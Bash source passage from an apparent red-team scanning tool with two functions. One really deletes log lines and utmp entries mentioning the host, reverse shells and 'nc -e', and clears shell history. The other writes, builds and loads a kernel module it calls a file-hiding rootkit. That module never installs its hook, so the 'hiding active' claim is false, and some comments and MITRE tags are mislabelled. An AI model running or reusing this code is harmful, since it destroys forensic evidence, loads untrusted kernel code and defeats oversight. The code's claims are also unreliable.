rt_725_log_tampering_anti_forensics() {
    rt_banner "RT-725" "Log Tampering and Anti-Forensics"
    local LOGS=("/var/log/auth.log" "/var/log/secure" "/var/log/syslog" "/var/log/messages" "/var/log/wtmp" "/var/log/btmp" "/var/log/lastlog")
    local CLEANED=0
    
    echo -e "    $CYAN[*] Checking log writability and cleaning traces...$NC"
    
    for log in "${LOGS[@]}"; do
        if [[ -f "$log" ]] && [[ -w "$log" ]]; then
            # Real: remove our traces from logs
            local HOSTNAME
            HOSTNAME=$(hostname 2>/dev/null)
            local IP
            IP=$(hostname -I 2>/dev/null | awk '{print $1}')
            sed -i "/$HOSTNAME/d; /$IP/d; /reverse shell/d; /nc -e/d; /bash -i/d" "$log" 2>/dev/null
            echo -e "    $GREEN[+] Cleaned $log — our traces removed$NC"
            CLEANED=1
        fi
    done
    
    # Wipe utmp/last entries
    if [[ -f /var/run/utmp ]] && [[ -w /var/run/utmp ]]; then
        # Real: use utmpdump to remove current session
        if command -v utmpdump &>/dev/null; then
            utmpdump /var/run/utmp 2>/dev/null | grep -v "$(whoami)" > /tmp/.utmp_clean 2>/dev/null
            utmpdump -r /tmp/.utmp_clean > /var/run/utmp 2>/dev/null
            rm -f /tmp/.utmp_clean 2>/dev/null
            echo -e "    $GREEN[+] utmp entries cleaned$NC"
            CLEANED=1
        fi
    fi
    
    # Clear bash history
    history -c 2>/dev/null
    cat /dev/null > "$HOME/.bash_history" 2>/dev/null
    cat /dev/null > /root/.bash_history 2>/dev/null
    export HISTFILE=/dev/null 2>/dev/null
    export HISTSIZE=0 2>/dev/null
    unset HISTFILE 2>/dev/null
    echo -e "    $GREEN[+] Shell history cleared and disabled$NC"
    
    # Set immutable on logs to prevent future logging
    if [[ "$(id -u)" == "0" ]] && command -v chattr &>/dev/null; then
        chattr +a /var/log/auth.log 2>/dev/null
        echo -e "    $YELLOW[!] Set append-only on auth.log — logs grow but old entries stay$NC"
    fi
    
    if [[ "$CLEANED" == "1" ]]; then
        add_vuln "RT-725" "HIGH" "Log Tampering" "Log files tampered — forensic evidence destroyed" "evasion" "root" "MITRE T1070.002"
    fi
    
    # Check for remote logging that we can't tamper
    if [[ -f /etc/rsyslog.conf ]]; then
        local REMOTE_LOG
        REMOTE_LOG=$(grep -E '^\*\.\*|@@' /etc/rsyslog.conf 2>/dev/null | grep -v '^#')
        if [[ -n "$REMOTE_LOG" ]]; then
            echo -e "    $YELLOW[!] Remote logging server configured — local tampering insufficient:$NC"
            echo "$REMOTE_LOG" | while read -r line; do echo -e "        $YELLOW$line$NC"; done
            add_vuln "RT-725" "INFO" "Remote Logging Detected" "Remote syslog server will retain logs despite local cleanup" "evasion" "info" "MITRE T1033"
        fi
    fi
}

rt_726_kernel_module_rootkit_evasion() {
    rt_banner "RT-726" "Kernel Module Rootkit Evasion"
    if [[ "$(id -u)" != "0" ]]; then
        echo -e "    $YELLOW[-] Root required for kernel module loading$NC"
        return
    fi
    
    local MOD_DIR="/tmp/.kmod"
    mkdir -p "$MOD_DIR" 2>/dev/null
    
    # Real: build minimal kernel module that hides processes
    cat > "$MOD_DIR/hide.c" << 'KMOD' 2>/dev/null
#include <linux/module.h>
#include <linux/proc_ns.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    if (ret <= 0) return ret;
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *prev = NULL, *curr = dirp;
    unsigned long offset = 0;
    while (offset < ret) {
        if (strstr(curr->d_name, ".net-") || strstr(curr->d_name, ".libpcap")) {
            if (prev) prev->d_reclen += curr->d_reclen;
            else ret -= curr->d_reclen;
        } else prev = curr;
        offset += curr->d_reclen;
        curr = (struct linux_dirent64 *)((char *)curr + curr->d_reclen);
    }
    return ret;
}
static int __init hide_init(void) { return 0; }
static void __exit hide_exit(void) { }
module_init(hide_init);
module_exit(hide_exit);
MODULE_LICENSE("GPL");
KMOD
    
    local KVER
    KVER=$(uname -r 2>/dev/null)
    if command -v make &>/dev/null && [[ -d /lib/modules/$KVER/build ]]; then
        cat > "$MOD_DIR/Makefile" << MKF 2>/dev/null
obj-m += hide.o
all:
	make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
clean:
	make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
MKF
        cd "$MOD_DIR" && make 2>/dev/null
        if [[ -f "$MOD_DIR/hide.ko" ]]; then
            insmod "$MOD_DIR/hide.ko" 2>/dev/null
            echo -e "    $RED[CRITICAL] Kernel module rootkit loaded — files matching .net- and .libpcap are HIDDEN from readdir$NC"
            add_vuln "RT-726" "CRITICAL" "Kernel Rootkit" "Kernel module rootkit loaded — file hiding active" "evasion" "root" "MITRE T1014"
        fi
        cd - > /dev/null 2>&1
    else
        # Fallback: use existing kernel module tools
        echo -e "    $YELLOW[!] Kernel headers not available — checking for loadable modules...$NC"
        local MOD_COUNT
        MOD_COUNT=$(lsmod 2>/dev/null | wc -l)
        echo -e "    $CYAN[*] Currently loaded modules: $MOD_COUNT$NC"
        add_vuln "RT-726" "HIGH" "Kernel Module Capable" "Kernel module loading enabled — rootkit possible with headers" "evasion" "root" "MITRE T1547.006"
    fi
    
    # Check for signed module requirement
    if [[ -f /proc/sys/kernel/modules_disabled ]] && [[ "$(cat /proc/sys/kernel/modules_disabled 2>/dev/null)" == "1" ]]; then
        echo -e "    $GREEN[+] Kernel module loading is DISABLED — rootkit blocked$NC"
    else
        echo -e "    $RED[CRITICAL] Kernel module loading is ENABLED$NC"
        add_vuln "RT-726" "CRITICAL" "Module Loading Enabled" "Kernel module loading not disabled — rootkit possible" "evasion" "root" "MITRE T1547.006"
    fi
    
    rm -rf "$MOD_DIR" 2>/dev/null
}

